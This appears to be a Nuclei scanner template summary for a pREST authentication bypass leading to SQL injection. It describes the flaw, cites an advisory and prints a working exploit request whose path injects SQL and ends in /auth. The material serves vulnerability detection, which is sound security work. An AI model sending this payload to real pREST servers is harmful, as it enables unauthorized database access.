# Nuclei Template: pREST < 1.5.4 - SQL Injection Via Authentication Bypass
**Template ID:** prest-sqli-auth-bypass
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**Source:** Nuclei Template (`prest-sqli-auth-bypass.yaml`)

## Vulnerability Information & PoC

## Description
An authentication bypass vulnerability was introduced by changing the JWT whitelist configuration to use a regex pattern, allowing unauthorized access to any path containing /auth and leading to SQL Injection.

## Steps to reproduce / Exploit Payload
```http
GET /{{database}}/information_schema".tables)s%20where%201=version()::int--/auth HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/advisories/GHSA-wm25-j4gw-6vr3
